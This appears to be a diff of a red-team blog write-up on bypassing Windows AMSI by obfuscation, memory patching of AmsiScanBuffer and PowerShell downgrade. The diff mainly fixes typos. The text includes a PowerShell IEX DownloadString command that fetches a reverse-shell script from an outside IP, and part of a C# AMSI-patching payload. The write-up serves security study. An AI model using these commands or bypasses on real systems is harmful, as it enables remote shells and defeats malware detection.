@@ -12,39 +12,38 @@ The goal of this write-up is to evade the most up to date AMSI protection measur
 
 ![](/assets/AV/diagram.png)  
 
-AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime
+AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime.
 
-By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware. This ultimately prevents arbitrary execution of code.
+By default, windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space.  `AmsiScanBuffer()`and `AmsiScanString()` are used by the antivirus before execution to scan the buffer and strings for suspicious activities. This ultimately prevents arbitrary execution of code.
 # AMSI Evasion
 The following evasive techniques aim to avoid detection by antivirus and security software.  
 
 ##### Code Fragmentation: 
-Code fragmentation involves breaking down malicious code into smaller, seemingly harmless components. This is then then assembled at runtime to evade static analysis.
+Code fragmentation involves breaking down malicious code into smaller, seemingly harmless components. This is then assembled at runtime to evade static analysis.
 This approach challenges antivirus scanners that rely on signature-based detection.
 
 ##### Obfuscation: 
-Obfuscation techniques are utilized to deliberately obscure the actual intent and functionality of a script. By employing various obfuscation methods, such as code encryption, renaming variables, adding meaningless code snippetsrue intent of the script, attackers can make their code appear convoluted. This makes AMSI scanners challenging  to interpret the true purpose of the script.
+Obfuscation techniques are utilized to deliberately obscure the actual intent and functionality of a script. By employing various obfuscation methods, such as code encryption, renaming variables, adding meaningless code snippet to obscure intent of the script, attackers can make their code appear convoluted. This makes AMSI scanners challenging  to interpret the true purpose of the script.
 
 #####  Memory Patching: 
 Memory patching modifies the AMSI Dynamic Link Library (DLL) in memory during runtime. This technique allows threat actors to temporarily disable or alter the functionality of AMSI. This allows attackers to run malicious scripts in memory without hindrance and triggering alerts. 
-#### Powershell Downgrade: 
-Powershell downgrading is switching the current Powershell to a lower version, the Windows PowerShell 2.0. This version lacks some of the essential security controls, including AMSI protection, which makes it more susceptible to exploitation by threat actors. By using an older version of PowerShell, attackers can bypass the built-in security measures present in newer versions and execute malicious scripts undetected.
+#### PowerShell Downgrade: 
+PowerShell downgrading is switching the current PowerShell to Windows PowerShell verison 2.0. This version does not have AMSI protection, which makes it susceptible to arbitrary code execution. By using an older version of PowerShell, attackers can bypass the built-in security measures present in newer versions and execute malicious scripts undetected.
 ## Proof of Concept
 
 ![](/assets/AV/Final.gif)  
 
-To verify that AMSI is correctly functioning, the tester first tried to initiate a reverse TCP connection through powershell using the below command in memory.
+To verify that AMSI is correctly functioning, the tester first tried to initiate a reverse TCP connection through PowerShell using the below command in memory.
 ```bash
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
 ```
-However, as seen above, AMSI sucessfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
+However, as seen above, AMSI successfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
 ## Memory Patching
-In order to bypass AMSI, the tester utilzed the following payload which was referenced from [Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass)
+In order to bypass AMSI, the tester utilized the following payload which was referenced from [Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass)
 ```bash
 $thing = @"
-// thing 
-// using System.Collections.ArrayList;
-using System; // thingssa
+
+using System;
 using System.Runtime.InteropServices;
 public class payload {
     [DllImport("kernel32")]
@@ -86,7 +85,8 @@ By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specif
 However, it is essential to acknowledge that even with the aforementioned payload, AMSI might still identify the content as malicious unless proper obfuscation methodologies are implemented. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
 string substitution (variables, functions, data-types) ,variable concatenation ,indentation randomization ,semi-random backticks insertion and randomization.
 
-Below is a code snippet of the payload after mulitple layers of obfuscation applied:  
+The below code snippet contains a payload that has undergone multiple layers of obfuscation.
+
 ![](/assets/AV/ob.png)  
 
 
